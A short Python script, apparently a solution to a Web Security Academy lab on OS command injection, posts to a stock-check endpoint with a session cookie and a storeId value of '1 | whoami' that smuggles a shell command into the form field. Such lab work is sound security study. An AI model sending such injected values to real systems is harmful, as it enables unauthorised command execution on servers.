import requests

url = "https://0ab3001803bbf63681410214009300bc.web-security-academy.net/product/stock"

cookies = {
    "session" : "YGnx9K6peR5uoZUpJvep6yq2U3HulVqZ"
}

data = {
    "productId" : "2",
    "storeId" : "1 | whoami"
}

r = requests.post(url, data=data, cookies=cookies)

print(r.text)